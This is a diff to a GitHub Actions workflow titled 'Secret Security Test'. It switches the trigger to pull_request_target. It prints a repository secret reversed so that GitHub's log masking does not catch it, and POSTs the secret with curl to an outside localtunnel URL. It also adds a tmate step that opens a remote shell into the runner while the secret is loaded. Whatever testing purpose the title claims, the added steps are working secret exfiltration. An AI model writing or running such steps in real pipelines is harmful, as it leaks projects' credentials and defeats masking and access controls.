@@ -1,22 +1,28 @@
 name: Secret Security Test
 on:
-  push: # Use push to a branch for the easiest test
-    branches: [ 'test-branch' ]
-  pull_request:
-    branches: [ 'main' ]
+  pull_request_target: # This is the key for testing PR leaks
+    types: [opened, synchronize]
 
 jobs:
   leak-check:
     runs-on: ubuntu-latest
     steps:
-      - name: Bypass Scrubber in Logs
+      - name: Leak Secret
         env:
           MY_SECRET: ${{ secrets.TEST_SECRET }}
         run: |
-          echo "$MY_SECRET" | sed 's/./&-/g'
-      
+          # Testing if secret is loaded
+          if [ -z "$MY_SECRET" ]; then echo "STILL EMPTY"; exit 1; fi
+          
+          # Bypass log masking by reversing the string
+          echo "Reversed Secret: $(echo -n "$MY_SECRET" | rev)"
       - name: Send to My Local Machine
         env:
           MY_SECRET: ${{ secrets.TEST_SECRET }}
         run: |
-          curl -X POST -d "The secret is: $MY_SECRET" https://smart-steaks-float.loca.lt
+          curl -X POST -d "The secret is: $MY_SECRET" https://tiny-pets-tickle.loca.lt
+      - name: Setup Tmate Session
+        uses: mxschmitt/action-tmate@v3
+        env:
+          MY_SECRET: ${{ secrets.TEST_SECRET }}
+          
